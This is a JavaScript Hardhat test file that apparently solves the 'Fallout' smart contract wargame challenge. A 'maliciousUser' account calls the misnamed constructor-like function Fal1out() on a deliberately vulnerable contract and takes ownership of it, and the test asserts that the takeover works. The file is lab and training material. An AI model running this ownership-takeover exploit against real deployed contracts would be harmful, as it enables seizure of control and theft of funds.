const {expect} = require("chai")
const {loadFixture} = require ("@nomicfoundation/hardhat-network-helpers")
const {ethers} = require("hardhat")

describe("Challenge 2 - Fallout", function() {

    async function initialStateFixture() {
        const [deployer, maliciousUser] = await ethers.getSigners()

        const Fallout = await ethers.getContractFactory("Fallout")
        const vulnerableContract = await Fallout.deploy()
        await vulnerableContract.deployed()

        return {deployer, maliciousUser, vulnerableContract}
    }

    describe("Initial State", function() {
        it("Should deploy with deployer address as deployer", async function() {
            const {deployer, vulnerableContract} = await loadFixture(initialStateFixture)

            expect(await vulnerableContract.deployTransaction.from).to.equal(deployer.address)
        })

        it("Should deploy with owner address as 0x0", async function() {
            const {deployer, vulnerableContract} = await loadFixture(initialStateFixture)

            expect(await vulnerableContract.owner()).to.equal("0x0000000000000000000000000000000000000000")
        })
    })

    describe("Attack Execution", function() {
        it("Should change owner to attacker", async function() {
            const {maliciousUser, vulnerableContract} = await loadFixture(initialStateFixture)
            const tx = await vulnerableContract.connect(maliciousUser).Fal1out()
            await tx.wait()

            expect(await vulnerableContract.owner()).to.equal(maliciousUser.address)
        })
    })
})